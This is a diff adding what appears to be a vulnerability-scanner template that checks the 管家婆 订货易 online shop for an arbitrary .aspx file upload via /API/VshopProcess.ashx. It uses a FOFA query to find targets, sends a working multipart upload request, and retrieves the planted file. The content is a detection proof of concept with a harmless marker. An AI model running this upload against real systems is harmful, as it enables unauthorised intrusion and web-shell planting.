@@ -1,0 +1,35 @@
+id: poc-yaml-guanjiapo-dinghuoyi-vshopprocess-arbitrary-file-upload
+info:
+  name: 管家婆 订货易在线商城 VshopProcess 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 管家婆订货易
+  fofa: title="订货易"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /API/VshopProcess.ashx?action=PostFileImg
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+  data: '------WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    Content-Disposition: form-data; name="fileup1i"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5--'
+  expression: 'status_code == 200 && contains(body,"/Storage/UserFileImg/")
+
+    '
+  output:
+  - regex_match(body,"UserFileImg/(?P<file>.*?).aspx")
+- method: GET
+  path: /Storage/UserFileImg/{{.file}}.aspx
+  expression: status_code == 200 && contains(body,t2) && !contains(body,"<")
+transport: http
